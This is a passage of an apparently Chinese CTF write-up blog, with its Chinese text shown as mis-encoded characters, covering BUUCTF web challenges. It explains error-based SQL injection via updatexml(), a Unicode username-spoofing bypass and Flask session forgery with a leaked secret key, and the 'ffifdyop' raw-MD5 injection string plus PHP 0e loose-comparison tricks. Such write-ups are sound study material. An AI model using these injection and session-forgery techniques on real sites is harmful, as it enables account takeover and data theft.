<p>å¯ä»¥è¯•å‡ºæ˜¯å•å¼•å·é—­åˆï¼Œä½†æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210727113650753.png" title="image-20210727113650753" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210727113650753.png" data-sub-html="<h2>é˜²æ­¢github page buildå¤±è´¥</h2><p>image-20210727113650753</p>">
        <img
            
            loading="lazy"
            src="image-20210727113650753.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210727113650753.png, image-20210727113650753.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210727113650753.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210727113650753.png">
    </a><figcaption class="image-caption">é˜²æ­¢github page buildå¤±è´¥</figcaption>
    </figure></p>
<p>è¿™é¢˜çš„ä¸»è¦çŸ¥è¯†ç‚¹å°±æ˜¯åˆ©ç”¨<code>updatexml()</code>å’Œ<code>extractvalue()</code>å‡½æ•°è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚ä½¿ç”¨<code>concat()</code>å‡½æ•°ï¼Œå†åŠ ä¸Š<code>~</code>æˆ–è€…<code>@</code>ç­‰èƒ½å¤Ÿå¼•èµ·è·¯å¾„å‚æ•°æŠ¥é”™çš„å­—ç¬¦ï¼Œå°†å½¢å¦‚<code>concat(0x7e, è¯­å¥, 0x7e)</code>è¿™æ ·çš„ç»“æœä½œä¸ºå‚æ•°ï¼Œå°±èƒ½å¤Ÿå¾—åˆ°<code>XPATH syntax error: 'å›æ˜¾ç»“æœ'</code>è¿™æ ·çš„æŠ¥é”™ä¿¡æ¯ï¼Œå®ç°æ³¨å…¥ã€‚</p>
<h3 id="å‚è€ƒé“¾æ¥-1" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5-1" class="header-mark"></a>å‚è€ƒé“¾æ¥ï¼š</h3><ul>
<li><a href="https://blog.csdn.net/Xxy605/article/details/116999699" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/Xxy605/article/details/116999699</a></li>
<li><a href="https://blog.csdn.net/weixin_45738112/article/details/105131866" target="_blank" rel="noopener noreferrer">SQLæŠ¥é”™æ³¨å…¥æ”»å‡»ä¸­çš„updatexml()å‡½æ•°</a></li>
</ul>
<h2 id="0x02-hctf-2018admin" class="headerLink">
    <a href="#0x02-hctf-2018admin" class="header-mark"></a>0x02 [HCTF 2018]admin</h2><p><a href="https://buuoj.cn/challenges#[HCTF%202018]admin" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
<p>è¿™æ˜¯ä¸€é“å¾ˆæœ‰è¶£çš„é¢˜ï¼Œç½‘ç«™æä¾›äº†æ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹å¯†ç ç­‰åŠŸèƒ½ã€‚</p>
<p>çœ‹æºç å¤§è‡´å¯ä»¥æ„Ÿè§‰åˆ°ï¼Œéœ€è¦ä½ ä»¥<code>admin</code>èº«ä»½ç™»å½•ï¼Œæ‰èƒ½å¤Ÿè·å–flagï¼Œä½†æ˜¯<code>admin</code>æ˜¯å·²ç»æ³¨å†Œè¿‡çš„ç”¨æˆ·ï¼Œæ‰€ä»¥åœ¨ä¸çŸ¥é“<code>admin</code>å¯†ç çš„æƒ…å†µä¸‹æ— æ³•ç™»å½•ã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png" title="image-20210724184059694" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png" data-sub-html="<h2>æºç æç¤º</h2><p>image-20210724184059694</p>">
        <img
            
            loading="lazy"
            src="image-20210724184059694.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png, image-20210724184059694.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184059694.png">
    </a><figcaption class="image-caption">æºç æç¤º</figcaption>
    </figure></p>
<p>æŸ¥é˜…ä¸€äº›wpä¹‹åï¼Œå¯ä»¥å¾—åˆ°3ç§è§£æ³•ã€‚</p>
<h3 id="è§£æ³•1å¼±å¯†ç " class="headerLink">
    <a href="#%e8%a7%a3%e6%b3%951%e5%bc%b1%e5%af%86%e7%a0%81" class="header-mark"></a>è§£æ³•1ï¼šå¼±å¯†ç </h3><p>è¿™æ˜¯å¾ˆæ‰¯çš„ä¸€ä¸ªè§£æ³•ï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œæœºç¼˜å·§åˆï¼Œç›´æ¥è¯•å‡ºæ¥äº†<code>admin</code>çš„å¯†ç æ˜¯<code>123</code>ğŸ¤£ï¼Œç™»å½•æ‹¿åˆ°flag</p>
<h3 id="è§£æ³•2unicodeæ¬ºéª—" class="headerLink">
    <a href="#%e8%a7%a3%e6%b3%952unicode%e6%ac%ba%e9%aa%97" class="header-mark"></a>è§£æ³•2ï¼šunicodeæ¬ºéª—</h3><p>é¢„æœŸè§£ä¹‹ä¸€ã€‚æŸ¥çœ‹ç½‘é¡µæºç å¯ä»¥çœ‹åˆ°è¯¥webåº”ç”¨æ˜¯ä¸€ä¸ªflaskåº”ç”¨ï¼Œæºç åœ°å€ä¸º<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener noreferrer">https://github.com/woadsl1234/hctf_flask</a></p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png" title="image-20210724184719396" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png" data-sub-html="<h2>æ”¹å¯†ç ç•Œé¢çš„æºç æ³¨é‡Šæç¤º</h2><p>image-20210724184719396</p>">
        <img
            
            loading="lazy"
            src="image-20210724184719396.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png, image-20210724184719396.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210724184719396.png">
    </a><figcaption class="image-caption">æ”¹å¯†ç ç•Œé¢çš„æºç æ³¨é‡Šæç¤º</figcaption>
    </figure></p>
<p>æŸ¥çœ‹æºç ä¸­çš„è·¯ç”±é€»è¾‘<code>routes.py</code>ï¼Œå…¶ä¸­çš„<code>login</code>ä¸<code>change</code>è·¯ç”±å¤„ç†é€»è¾‘ä½¿ç”¨äº†è¿‡æ—¶ç‰ˆæœ¬twistedæ¡†æ¶ä¸­çš„<code>nodeprep.prepare()</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†<code>á´¬</code>è½¬æ¢ä¸º<code>A</code>ï¼Œç„¶åè½¬æ¢ä¸ºå°å†™çš„<code>a</code>ï¼ˆè¿™ä¸ªçŸ¥è¯†ç‚¹æˆ‘ä¹Ÿä¸çŸ¥é“è·å–çš„æ¸ é“æ˜¯ä»€ä¹ˆï¼‰ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">current_user</span><span class="o">.</span><span class="n">is_authenticated</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">form</span> <span class="o">=</span> <span class="n">LoginForm</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span> <span class="o">=</span> <span class="n">strlower</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">)</span> <span class="o">//&lt;------</span><span class="n">å°±åœ¨è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„strlower</span><span class="p">()</span><span class="n">å‡½æ•°</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">name</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">name</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">user</span><span class="o">.</span><span class="n">check_password</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Invalid username or password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">login_user</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">remember</span><span class="o">=</span><span class="n">form</span><span class="o">.</span><span class="n">remember_me</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">,</span> <span class="n">title</span> <span class="o">=</span> <span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">form</span> <span class="o">=</span> <span class="n">form</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">strlower</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">nodeprep</span><span class="o">.</span><span class="n">prepare</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">username</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>æŠ€å·§<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">æ‰€ä»¥Unicodeæ¬ºéª—çš„åšæ³•å°±æ˜¯å…ˆæ³¨å†Œä¸€ä¸ª<code>á´¬DMIN</code>ç”¨æˆ·ï¼Œç„¶åä¿®æ”¹å¯†ç ã€‚åœ¨æ³¨å†Œä¸ä¿®æ”¹å¯†ç çš„è¿‡ç¨‹ä¸­usernameä¼šå‘ç”Ÿå¦‚ä¸‹è½¬å˜<code>á´¬DMIN</code>-&gt;<code>Admin</code>-&gt;<code>admin</code>ï¼Œæ‰€ä»¥ç›¸å½“äºèƒ½å¤Ÿæ§åˆ¶<code>admin</code>ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åå°±èƒ½å¤Ÿä»¥<code>admin</code>ç”¨æˆ·çš„èº«ä»½ç™»å½•ï¼Œè·å–flagã€‚</div>
        </div>
    </div>
<h3 id="è§£æ³•3-ä¿®æ”¹flask-session" class="headerLink">
    <a href="#%e8%a7%a3%e6%b3%953-%e4%bf%ae%e6%94%b9flask-session" class="header-mark"></a>è§£æ³•3ï¼š ä¿®æ”¹flask session</h3><p>é‚£ä¸ªwebåº”ç”¨æ˜¯ä¸ªflaskåº”ç”¨ï¼Œflaskæ˜¯å°†<code>session</code>ä¿å­˜åœ¨æœ¬åœ°çš„ï¼Œå¹¶ä¸”æ²¡æœ‰åšåŠ å¯†ï¼Œè€Œæ˜¯ä»…ä»…è¿›è¡Œäº†ç­¾åä»¥é˜²ç¯¡æ”¹ï¼Œè€Œæœç´¢æºä»£ç å¯ä»¥çœ‹åˆ°å…¶ç­¾åä½¿ç”¨çš„å¯†é’¥ä¸º<code>ckj123</code>ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Config</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;ckj123&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SQLALCHEMY_DATABASE_URI</span> <span class="o">=</span> <span class="s1">&#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="o">=</span> <span class="kc">True</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨burpæ‹¦æˆªæ™®é€šç”¨æˆ·ç™»å½•åæŸ¥çœ‹Indexé¡µé¢çš„è¯·æ±‚ï¼Œå†ä½¿ç”¨<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener noreferrer">flask sessionç¼–è§£ç å·¥å…·</a>è§£ç æ‹¦æˆªåˆ°çš„<code>session</code>ï¼Œç„¶åä¿®æ”¹å…¶ä¸­çš„ç”¨æˆ·IDï¼Œå†é‡å‘è¯·æ±‚ï¼Œå³å¯è·å¾—flagã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png" title="image-20210726171651090" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png" data-sub-html="<h2>è§£ç </h2><p>image-20210726171651090</p>">
        <img
            
            loading="lazy"
            src="image-20210726171651090.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png, image-20210726171651090.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171651090.png">
    </a><figcaption class="image-caption">è§£ç </figcaption>
    </figure></p>
<p>å°†<code>name</code>æ”¹ä¸º<code>admin</code>ï¼Œå†è¿›è¡Œç­¾åã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png" title="image-20210726172004692" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png" data-sub-html="<h2>é‡æ–°ç­¾å</h2><p>image-20210726172004692</p>">
        <img
            
            loading="lazy"
            src="image-20210726172004692.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png, image-20210726172004692.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726172004692.png">
    </a><figcaption class="image-caption">é‡æ–°ç­¾å</figcaption>
    </figure></p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png" title="image-20210726171919586" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png" data-sub-html="<h2>é‡å‘æ‹¿åˆ°flag</h2><p>image-20210726171919586</p>">
        <img
            
            loading="lazy"
            src="image-20210726171919586.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png, image-20210726171919586.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210726171919586.png">
    </a><figcaption class="image-caption">é‡å‘æ‹¿åˆ°flag</figcaption>
    </figure></p>
<h3 id="å‚è€ƒé“¾æ¥-2" class="headerLink">
    <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5-2" class="header-mark"></a>å‚è€ƒé“¾æ¥ï¼š</h3><ul>
<li>
<p><a href="https://blog.csdn.net/mochu7777777/article/details/109302175" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/mochu7777777/article/details/109302175</a></p>
</li>
<li>
<p><a href="https://unicode-table.com/en/" target="_blank" rel="noopener noreferrer">Unicode Character Table</a></p>
</li>
<li>
<p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener noreferrer">å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p>
</li>
</ul>
<h2 id="0x03-bjdctf2020easy-md5" class="headerLink">
    <a href="#0x03-bjdctf2020easy-md5" class="header-mark"></a>0x03 [BJDCTF2020]Easy MD5</h2><p><a href="https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5" target="_blank" rel="noopener noreferrer">é¢˜ç›®é“¾æ¥</a></p>
<p>ä¸€é“è€ƒå¯Ÿphpä¸­çš„<code>md5()</code>ç”¨æ³•çš„é¢˜ã€‚</p>
<p>ç½‘ç«™é•¿è¿™æ ·</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221230795.png" title="image-20210811221230795" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221230795.png" data-sub-html="<h2>ç½‘ç«™é¡µé¢</h2><p>image-20210811221230795</p>">
        <img
            
            loading="lazy"
            src="image-20210811221230795.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221230795.png, image-20210811221230795.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221230795.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221230795.png">
    </a><figcaption class="image-caption">ç½‘ç«™é¡µé¢</figcaption>
    </figure></p>
<h3 id="level1" class="headerLink">
    <a href="#level1" class="header-mark"></a>level1</h3><p>é¦–å…ˆéšä¾¿è¾“å…¥ï¼ŒæŠ“åŒ…å¾—åˆ°hintæç¤º</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221151702.png" title="image-20210811221151702" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221151702.png" data-sub-html="<h2>hintæç¤º</h2><p>image-20210811221151702</p>">
        <img
            
            loading="lazy"
            src="image-20210811221151702.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221151702.png, image-20210811221151702.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221151702.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811221151702.png">
    </a><figcaption class="image-caption">hintæç¤º</figcaption>
    </figure></p>
<p>å¯ä»¥çœ‹åˆ°æäº¤è¯·æ±‚å¯¹åº”çš„è¯­å¥ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="s1">&#39;admin&#39;</span> <span class="nx">where</span> <span class="nx">password</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">,</span><span class="k">true</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œè¦æ³¨å…¥çš„è¯å°±å¾—ä½¿<code>md5($pass, true)</code>å€¼ä¸º<code>' or 'xxx</code>ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾ä¸ªå­—ç¬¦ä¸²ä½¿å…¶md5ç»“æœæ»¡è¶³è¿™ä¸€è¦æ±‚ã€‚éå†å¯ä»¥çˆ†å‡ºç»“æœï¼Œä½†å…¶å®æœ‰ç»éªŒçš„è¯å°±çŸ¥é“<code>&quot;ffifdyop&quot;</code>æ»¡è¶³ä¸Šè¿°éœ€æ±‚ï¼Œæ˜¯<a href="https://www.cnblogs.com/tqing/p/11852990.html" target="_blank" rel="noopener noreferrer">md5æ³¨å…¥æ—¶å¸¸ç”¨çš„å­—ç¬¦ä¸²</a>ï¼Œå…¶md5ç»“æœä¸º<code>' or '6xxxxx</code>ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;ffifdyop&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">plain</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">=================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">276</span><span class="n">f722736c95d99e921722cf9ed621c</span>
</span></span><span class="line"><span class="cl"><span class="sa">b</span><span class="s2">&#34;&#39;or&#39;6</span><span class="se">\xc9</span><span class="s2">]</span><span class="se">\x99\xe9</span><span class="s2">!r,</span><span class="se">\xf9\xed</span><span class="s2">b</span><span class="se">\x1c</span><span class="s2">&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ”¾åˆ°ä¸Šè¿°è¯­å¥å°±ç›¸å½“äº</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="s1">&#39;admin&#39;</span> <span class="nx">where</span> <span class="nx">password</span><span class="o">=</span> <span class="s1">&#39;&#39;</span> <span class="k">or</span> <span class="s1">&#39;6xxxxx&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="level2" class="headerLink">
    <a href="#level2" class="header-mark"></a>level2</h3><p>æ³¨å…¥é€šè¿‡ä¹‹åï¼Œåˆ°äº†ç¬¬äºŒå…³</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224151331.png" title="image-20210811224151331" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224151331.png" data-sub-html="<h2>Do You Like MD5?</h2><p>image-20210811224151331</p>">
        <img
            
            loading="lazy"
            src="image-20210811224151331.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224151331.png, image-20210811224151331.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224151331.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224151331.png">
    </a><figcaption class="image-caption">Do You Like MD5?</figcaption>
    </figure></p>
<p>åˆå¯ä»¥çœ‹åˆ°æç¤ºï¼Œè¦æ±‚<code>$a != $b</code> ä½†æ˜¯<code>md5($a) == md5($b)</code>ã€‚</p>
<p><figure><a class="lightgallery" href="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224234490.png" title="image-20210811224234490" data-thumbnail="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224234490.png" data-sub-html="<h2>ç¬¬äºŒä¸ªæç¤º</h2><p>image-20210811224234490</p>">
        <img
            
            loading="lazy"
            src="image-20210811224234490.png"
            srcset="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224234490.png, image-20210811224234490.png 1.5x, /2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224234490.png 2x"
            sizes="auto"
            alt="/2021-07-19-buuctf-web%E8%AE%B0%E5%BD%95-3/image-20210811224234490.png">
    </a><figcaption class="image-caption">ç¬¬äºŒä¸ªæç¤º</figcaption>
    </figure></p>
<p>è¦æ»¡è¶³å‰é¢çš„<code>!=</code>å’Œåé¢çš„å¼±ç›¸ç­‰ï¼Œå­˜åœ¨ä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li><code>md5($a)</code>ä¸<code>md5($b)</code>ç»“æœä»¥<code>0e</code>å¼€å¤´ã€‚phpåœ¨å¤„ç†è¿™æ ·çš„å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ä¼šå°†å…¶å½“ä½œç§‘å­¦è®¡æ•°æ³•ï¼Œå¹¶ä¸”åº•æ•°ä¸º0ï¼Œæ‰€ä»¥ç»“æœéƒ½ä¸º0</li>
<li><code>$a</code>ä¸<code>$b</code>ä¸ºæ•°ç»„ã€‚<code>md5()</code>æ— æ³•å¤„ç†æ•°ç»„è¾“å…¥ï¼Œæ‰€ä»¥ä¼šè¿”å›<code>null</code>ï¼Œè¿™ç§æƒ…å†µä¹Ÿæ»¡è¶³ä¸Šè¿°æ¡ä»¶</li>
</ul>
<p>å…·ä½“å†…å®¹å¯ä»¥å‚ç…§<a href="https://www.loongten.com/2020/02/22/ctf-php-md5/" target="_blank" rel="noopener noreferrer">è¿™ç¯‡åšå®¢</a></p>
<p>æ‰€ä»¥ï¼Œç›´æ¥é€‰ä¸¤ä¸ªä¸åŒçš„ä½†æ˜¯md5ç»“æœéƒ½ä»¥<code>0e</code>å¼€å¤´çš„å­—ç¬¦ä¸²ä½œä¸ºa bçš„å€¼å³å¯ã€‚</p>
